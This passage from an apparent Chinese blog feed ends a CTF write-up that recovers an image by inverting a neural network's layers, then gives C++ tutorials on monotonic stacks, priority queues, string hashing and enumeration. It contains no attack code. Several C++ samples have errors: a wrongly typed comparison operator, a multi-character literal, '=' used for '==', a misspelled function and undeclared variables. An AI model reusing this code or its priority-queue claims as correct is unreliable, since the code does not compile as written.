<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型参数</span></span><br><span class="line">net = torch.load(<span class="string">&#x27;net.pt&#x27;</span>)</span><br><span class="line"><span class="comment"># 将图片转换为灰度图并将像素值归一化到 0~1</span></span><br><span class="line">image = np.array(Image.<span class="built_in">open</span>(<span class="string">&#x27;enc.png&#x27;</span>).convert(<span class="string">&#x27;L&#x27;</span>)) / <span class="number">255</span></span><br><span class="line"><span class="comment"># 转换为 pytorch 张量</span></span><br><span class="line">image =  torch.Tensor(image).reshape([<span class="number">1</span>, <span class="number">197</span>, <span class="number">800</span>])</span><br><span class="line"><span class="comment"># 获取卷积层的权重</span></span><br><span class="line">w_conv_sum = net[-<span class="number">2</span>].weight.detach().<span class="built_in">sum</span>()</span><br><span class="line">b_conv = net[-<span class="number">2</span>].bias.detach()</span><br><span class="line"><span class="comment"># 获取线性变化层的矩阵</span></span><br><span class="line">w_linear = net[-<span class="number">3</span>].weight.detach()</span><br><span class="line">b_linear = net[-<span class="number">3</span>].bias.detach()</span><br><span class="line"><span class="comment"># sigmoid 逆变换</span></span><br><span class="line">image = -torch.log((<span class="number">1</span>/image)-<span class="number">1</span>)</span><br><span class="line">recover_image = ((image-b_conv)/w_conv_sum - b_linear) @ w_linear.T.pinverse()</span><br><span class="line">plt.imshow(recover_image[<span class="number">0</span>,:,:],cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>复原后的效果为:</p>
<p><img src="/2023/11/29/HITCTF-network-in-network/image.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>神经网络</tag>
        <tag>图像恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】基础数据结构的使用</title>
    <url>/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="【算法】基础数据结构的使用"><a href="#【算法】基础数据结构的使用" class="headerlink" title="【算法】基础数据结构的使用"></a>【算法】基础数据结构的使用</h1><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><p>通过维护一个单调递增或者单调递减的栈, 来求解元素左右大小边界的问题.</p>
<p>尝试思考下面这个问题, 对于第 1 个元素, 他往右边看, 除了比他高的, 都会被挡住(如第 3 个和第 4 个元素), 而这个就是单调栈的核心思想, 在这里被挡住的元素对当前节点来说是没用的信息, 所以单调栈维护的是当前节点往右边看, <strong>不会被挡住</strong>的元素.</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image.png"></p>
<p>来看一道例题</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-1.png"></p>
<p>这道例题中, 需要我们找到第一个大于当前元素的元素的下标, 那就是一个大小边界的问题, 我们直接从这个序列的最右边开始遍历, 然后为每一个节点维护一个单调栈. 即当前栈中如果存在比他小的, 就直接 pop 出去即可, 因为对于当前元素后面的元素, <strong>这些都是被挡住的元素</strong>.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">3e6</span>+<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> n, num[MAXN], ans[MAXN];</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; sta;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n; i&gt;=<span class="number">1</span>; i--)&#123;</span><br><span class="line">        <span class="comment">// 如果发现当前栈内有元素比自己小</span></span><br><span class="line">        <span class="keyword">while</span>(!sta.<span class="built_in">empty</span>() &amp;&amp; num[i]&gt;num[sta.<span class="built_in">top</span>()])&#123;</span><br><span class="line">            sta.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        ans[i] = sta.<span class="built_in">empty</span>() ? <span class="number">0</span>:sta.<span class="built_in">top</span>();</span><br><span class="line">        sta.<span class="built_in">push</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="优先级队列"><a href="#优先级队列" class="headerlink" title="优先级队列"></a>优先级队列</h2><p>优先级队列(priority queue)是由二叉堆实现的, <code>push</code> 和 <code>pop</code> 的复杂度是 O(logn) ,当用优先队列去处理 <code>pair</code> 元素时, 他会按照 <code>pair</code> 中大的那个进行优先级排序, 优先级队列也是队列, 队列中如果 <code>pop</code> 了一个元素, 他不会释放分配过的内存, 只有析构的时候才会一起分配, 所以如果你 <code>pop</code> 一个元素后马上使用 <code>back</code> 去读取他还是能读到之前的元素的.</p>
<p>例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-2.png"></p>
<p>优先队列模板题, 维护一个大端序的优先队列, 每次遇到 IN 事件就加入到队列中, 遇到 OUT 事件就从队列中取出, 如果队列为空就输出 EMPTY, 需要注意的是这里如果优先权一样, 就要选择最早来排队的病人, 所以要重构 operator, 然后把这个 operator 应用到优先队列中.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储病人信息的结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> level, pos;</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> <span class="type">int</span> x, <span class="type">const</span> <span class="type">int</span> y)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x.level != y.level)</span><br><span class="line">            <span class="keyword">return</span> x.level &lt; y.level;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> x.pos &gt; y.pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,a,b;</span><br><span class="line">    string opt;</span><br><span class="line">    <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n)&#123;</span><br><span class="line">        priority_queue&lt;node&gt; que[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">            cin&gt;&gt;opt;</span><br><span class="line">            <span class="keyword">if</span>(opt == <span class="string">&#x27;IN&#x27;</span>)&#123;</span><br><span class="line">                cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">                cnt++;</span><br><span class="line">                que[a].<span class="built_in">push</span>(b)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(opt == <span class="string">&#x27;OUT&#x27;</span>)&#123;</span><br><span class="line">                cin&gt;&gt;a;</span><br><span class="line">                <span class="keyword">if</span>(que[a].<span class="built_in">empty</span>())</span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;EMPTY&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    cout&lt;&lt;que[a].top.pos&lt;&lt;endl;</span><br><span class="line">                    que[a].<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>哈希表就是通过映射将字符串通过一些加密函数转换后进行存储, 可以进行<strong>状态压缩</strong>, 将大集合映射成小集合.</p>
<p>一般的哈希函数很容易发生值冲突, 这里给一个字符串哈希的模板代码:</p>
<p>根据公式:</p>
<p>$$ Hash(S) &#x3D; (\sum_{i&#x3D;1}^nc_i * base^n-1) \mod p $$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHash</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> base=<span class="number">31</span>;</span><br><span class="line">    <span class="type">int</span> mod = <span class="number">1222827239</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        res = (res*base+(s[i]-<span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哈希状态压缩例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-3.png"></p>
<p>需要注意的是, 这道题的范围 $N \leq 10000, M_max \leq 1500$, 如果使用 <code>vector</code> 存储数据, 需要花费的最大空间计算如下:</p>
<p>$$ \frac{10000 \times 1500}{1 \times 1024 \times 1024} \approx 15 \text{ MB} $$</p>
<p>这里的 $1$ 是因为对于每个字符是 char 格式, 占一个字节. 最大需要消耗 15mb 的内存空间, 所以会爆掉, 这里要用哈希去状态压缩, 然后使用 <code>set</code> 去重, 最后返回 <code>size</code> 就是答案, 代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHash</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> base=<span class="number">31</span>;</span><br><span class="line">    <span class="type">int</span> mod = <span class="number">1222827239</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        res = (res*base+(s[i]-<span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">        string str;</span><br><span class="line">        cin&gt;&gt;str;</span><br><span class="line">        res.<span class="built_in">insert</span>(<span class="built_in">getHash</span>(str));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res.<span class="built_in">size</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重哈希状态压缩, 例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-4.png"></p>
<p>这里内存和时间都卡的很死, 思路是使用双重哈希, 具体做法是用一个 <code>vector</code> 数组顺序保存词典索引和词典内容, 然后用 <code>map</code> 去记录对应 hash 的下标. 因为 <code>map</code> 里面是红黑树, 如果直接存映射会爆内存的.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHash</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 注意这里是 longlong 防止溢出</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> base=<span class="number">65337</span>;</span><br><span class="line">    <span class="type">int</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        res = (res*base+(s[i]-<span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;hash2pos;</span><br><span class="line">    vector&lt;string&gt; dicts;</span><br><span class="line">    string str;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">getline</span>(cin,str)&amp;&amp; str!=<span class="string">&quot;@END@&quot;</span>)&#123;</span><br><span class="line">        <span class="type">int</span> pos = str.<span class="built_in">find</span>(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        string dict = str.<span class="built_in">substr</span>(<span class="number">0</span>,pos+<span class="number">1</span>);</span><br><span class="line">        string fun = str.<span class="built_in">substr</span>(pos+<span class="number">2</span>,str.<span class="built_in">length</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> dict_hash = <span class="built_in">getHash</span>(dict);</span><br><span class="line">        <span class="type">int</span> fun_hash = <span class="built_in">getHash</span>(fun);</span><br><span class="line">        <span class="comment">// 将 dict 和 function 存入 vector 数组</span></span><br><span class="line">        dicts.<span class="built_in">push_back</span>(dict);</span><br><span class="line">        dicts.<span class="built_in">push_back</span>(fun);</span><br><span class="line">        <span class="comment">// 用 map 存 vector 的数组索引</span></span><br><span class="line">        hash2pos[dict_hash] = dicts.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        hash2pos[fun_hash] = dicts.<span class="built_in">size</span>()<span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        cin&gt;&gt;str;</span><br><span class="line">        <span class="type">int</span> hashvalue = <span class="built_in">getHash</span>(str);</span><br><span class="line">        <span class="keyword">if</span>(str[<span class="number">0</span>]=<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash2pos.count[hashvalue]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                cout&lt;&lt;dict[hash2pos[hashvalue]]&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;what?&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash2pos.count[hashvalue]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                string res = dicts[hash2pos[hashvalue]];</span><br><span class="line">                <span class="comment">// 去掉方括号</span></span><br><span class="line">                res = res.<span class="built_in">substr</span>(<span class="number">1</span>,res.<span class="built_in">size</span>()<span class="number">-2</span>);</span><br><span class="line">                cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;what?&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>STL</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】暴力求解法</title>
    <url>/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】暴力求解法"><a href="#【算法】暴力求解法" class="headerlink" title="【算法】暴力求解法"></a>【算法】暴力求解法</h1><h2 id="简单枚举"><a href="#简单枚举" class="headerlink" title="简单枚举"></a>简单枚举</h2><p>简单枚举的基本思路就是, 枚举起点, 枚举终点, 然后里面再去做运算, 例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image.png"></p>
<p>对于这道题, 如果使用暴力枚举法的话, 就要枚举每一个元素作为起点, 再枚举每个元素前面的元素作为终点的情况, 代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> ncase=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n)&#123;</span><br><span class="line">        <span class="comment">// 注意会溢出</span></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> num[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;num[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; i+j&lt;n; j++)&#123;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> tmp = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;j; k++)&#123;</span><br><span class="line">                    tmp *= num[i+k];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(tmp&gt;ans)&#123;</span><br><span class="line">                    ans = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            ans = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;++ncase&lt;&lt;<span class="string">&quot;: The maximum product is&quot;</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里给一个值范围的表格:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-1.png"></p>
<h2 id="排列法枚举"><a href="#排列法枚举" class="headerlink" title="排列法枚举"></a>排列法枚举</h2><p>排列法进行枚举可以使用 STL 中的 <code>next_permutation()</code> , 复杂度为 O(n), 用法如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next_permutation</span>() <span class="comment">// 获取下一个排列组合</span></span><br><span class="line"><span class="built_in">prev_permutation</span>() <span class="comment">// 获取上一个排列组合</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// next_premutation(起点, 终点)</span></span><br><span class="line"><span class="comment">//如果有下一个排列组合就返回 true 并替换当前数组, 如果没有就返回 false</span></span><br><span class="line"><span class="type">int</span> num[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    cout&lt;&lt;num[<span class="number">0</span>]&lt;&lt;num[<span class="number">1</span>]&lt;&lt;num[<span class="number">2</span>]&lt;&lt;num[<span class="number">3</span>]&lt;&lt;endl</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="built_in">next_premutation</span>(num,num+<span class="number">4</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-2.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">        <span class="type">int</span> num[<span class="number">1010</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            num[i]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> tmp=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp==m) <span class="keyword">break</span>;</span><br><span class="line">            tmp++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(num+<span class="number">1</span>,num+n+<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cout&lt;&lt;num[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;num[n]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二进制法"><a href="#二进制法" class="headerlink" title="二进制法"></a>二进制法</h2><p>常用的位运算符有 左移(&lt;&lt;) 和 右移(&gt;&gt;), 位运算操作不建议对<strong>负数</strong>操作</p>
<p> 其中 <code>x&lt;&lt;k</code> 表示将 x 转换为二进制再左移 k 位补零, 十进制下的运算为 $x*2^k$.</p>
<p><code>x&gt;&gt;k</code> 在十进制下的运算为 $x&#x2F;2^k$.</p>
<p>位运算常用于状态压缩, 比如有 5 个物品, 我们可以用二进制数 <code>01000</code> 表示只有第 2 个物品被取了, 其他物品没有被取. 当需要枚举的子集或者超集的时候, 就可以使用状态压缩.</p>
<p>以下是常用的位运算技巧:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-3.png"></p>
<p>例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-4.png"></p>
<p>这道题可以使用二进制枚举来做</p>
<p>首先是如何用二进制去表示每一个排列组合, 对于 $n$ 个正整数, 从 $0$ 遍历到 $2^n-1$ 就可以表示所有的组合了, 二进制下就是 $00..00$ 遍历到 $11..11$, 然后使用<strong>位运算</strong>去获取所有的排列, 这里用的位运算是 <code>(i&amp;(1&lt;&lt;j))</code> 表示获取 <code>i</code> 的 第 <code>j</code> 位, 代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sort 的时候用来对排列后的结果排序</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a, vector&lt;<span class="type">int</span>&gt; b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;a.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=b[i])&#123;</span><br><span class="line">            <span class="keyword">return</span> a[i]&lt;b[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,r;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    <span class="comment">// 遍历所有组合</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(<span class="number">1</span>&lt;&lt;n); i++)&#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历排列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//恢复获选的排列</span></span><br><span class="line">        <span class="keyword">if</span>(cnt==r)&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt;tmp;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    <span class="comment">// 注意区分值和索引</span></span><br><span class="line">                    tmp.<span class="built_in">push_back</span>(j+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 